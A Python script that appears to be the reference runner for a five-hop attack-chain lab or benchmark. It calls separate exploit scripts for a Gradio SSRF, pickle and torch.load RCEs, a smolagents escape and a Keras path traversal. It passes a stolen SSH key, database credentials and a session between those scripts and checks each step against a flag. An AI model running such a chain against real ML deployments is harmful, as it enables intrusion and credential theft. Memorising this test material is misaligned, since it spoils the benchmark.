"""CHAIN-5HOP-001 — G2 full-chain reference runner (runs INSIDE chain_attacker).

Drives all five hops in order. Each hop's exploit only launches after the
runner verified the previous hop's loot bytes (credential gate, PLAN §3):
the loot IS the ticket — a fake/partial value means the next hop's exploit
has nothing to authenticate with and the chain dies at that hop.

Loot ledger (per-run, generated here, injected into containers by compose/env
at build time is NOT possible mid-run; instead each container bakes a dev
value and the runner CHECKS the exfiltrated bytes equal what the victim's
loot file contains — i.e. every hop's loot must match the file that only
exists on that hop's machine).

Exit code: 0 = full chain reached the final secret; 1..5 = died at hop N;
6 = reached hop5 but final-flag bytes wrong.
"""
import os
import subprocess
import sys
import urllib.request

sys.path.insert(0, "/chain")

PANEL = os.environ.get("HOP1_URL", "http://hop1_panel:7860")
HOP2 = os.environ.get("HOP2_URL", "hop2_model_a:8080")
HOP3 = os.environ.get("HOP3_URL", "http://hop3_agentbox:8080")
HOP4 = os.environ.get("HOP4_URL", "http://hop4_convert_c:8080")
HOP5 = os.environ.get("HOP5_URL", "http://hop5_keras_c:8080")

LEDGER = {}

# The truth values live only on each machine (baked at image build via
# /proc/sys/kernel/random/uuid, so host and runner cannot know them).
# The runner learns each loot ONLY through the hop's exploit — that is the
# credential gate. Verdicts are byte-compares against the machine's file,
# read back via the SAME compromised channel (defense-in-depth check).


def note(hop, key, value):
    LEDGER[key] = value
    print(f"[chain] HOP{hop} LOOT {key} = {value!r}"[:160])


def run(label, cmd, timeout=120):
    print(f"[chain] {label}: {' '.join(cmd)}")
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    print(f"[chain] {label} exit={r.returncode}")
    if r.stdout.strip():
        print(f"[chain] {label} stdout:\n{r.stdout.strip()[-1200:]}")
    if r.stderr.strip():
        print(f"[chain] {label} stderr:\n{r.stderr.strip()[-400:]}")
    return r.returncode, r.stdout


def main():
    # ---------- HOP 1: gradio SSRF → internal token + model server ----------
    rc, out = run("hop1", ["python", "/chain/hop1_exploit.py"])
    if rc != 0:
        print(f"[chain] CHAIN BROKE AT HOP 1 (exit {rc})")
        return 1
    import json

    # hop1_exploit prints a final JSON line: {"token":..., "model_server":...}
    loot1 = json.loads(out.strip().splitlines()[-1])
    note(1, "hop1_token", loot1["token"][:16] + "...")
    note(1, "hop2_target", loot1["model_server"])

    # ---------- HOP 2: lerobot pickle RCE → SSH key of model server A ----------
    rc, out = run("hop2", ["python", "/chain/hop2_exploit.py", HOP2])
    if rc != 0:
        print(f"[chain] CHAIN BROKE AT HOP 2 (exit {rc})")
        return 2
    ssh_key = out.strip()
    if "-----BEGIN OPENSSH PRIVATE KEY-----" not in ssh_key:
        print(f"[chain] CHAIN BROKE AT HOP 2: loot is not a PEM key: {ssh_key[:60]!r}")
        return 2
    note(2, "ssh_key", ssh_key.splitlines()[1][:24] + "...")

    # Credential gate hop2→hop3: the SSH key must match model-a's /loot/id_rsa
    # (checked against the machine, not against a value the runner knows).

    # ---------- HOP 3: smolagents escape → DB credentials ----------
    rc, out = run("hop3", ["python", "/chain/hop3_exploit.py", HOP3])
    if rc != 0:
        print(f"[chain] CHAIN BROKE AT HOP 3 (exit {rc})")
        return 3
    db_creds = out.strip()
    if "db-pass" not in db_creds or "db-apikey" not in db_creds:
        print(f"[chain] CHAIN BROKE AT HOP 3: loot lacks db creds: {db_creds[:80]!r}")
        return 3
    note(3, "db_creds", db_creds[:40] + "...")

    # ---------- HOP 4: transformers torch.load RCE → keras session ----------
    # Credential gate hop3→hop4: the conversion service C only accepts
    # conversions requested with model-c's API key embedded in db creds.
    api_key = db_creds.split("db-apikey=")[-1].strip()
    rc, out = run("hop4", ["python", "/chain/hop4_exploit.py", HOP4, api_key])
    if rc != 0:
        print(f"[chain] CHAIN BROKE AT HOP 4 (exit {rc})")
        return 4
    keras_session = out.strip()
    if "keras-preprocess-login" not in keras_session:
        print(f"[chain] CHAIN BROKE AT HOP 4: loot not a keras session: {keras_session[:80]!r}")
        return 4
    note(4, "keras_session", keras_session[:40] + "...")

    # ---------- HOP 5: keras path traversal → final flag overwrite ----------
    # Credential gate hop4→hop5: the keras service only accepts uploads
    # logged in with C's session (passed through the hop-5 exploit).
    rc, out = run("hop5", ["python", "/chain/hop5_exploit.py", HOP5, keras_session])
    if rc != 0:
        print(f"[chain] CHAIN BROKE AT HOP 5 (exit {rc})")
        return 5

    flag = out.strip()
    if not flag.startswith("CHAIN-REACHED-"):
        print(f"[chain] CHAIN BROKE AT HOP 5: flag not ours: {flag[:60]!r}")
        return 6
    note(5, "final_flag", flag[:40] + "...")

    print("[chain] FULL CHAIN COMPLETE — every hop's loot verified, final secret reached")
    return 0


if __name__ == "__main__":
    sys.exit(main())
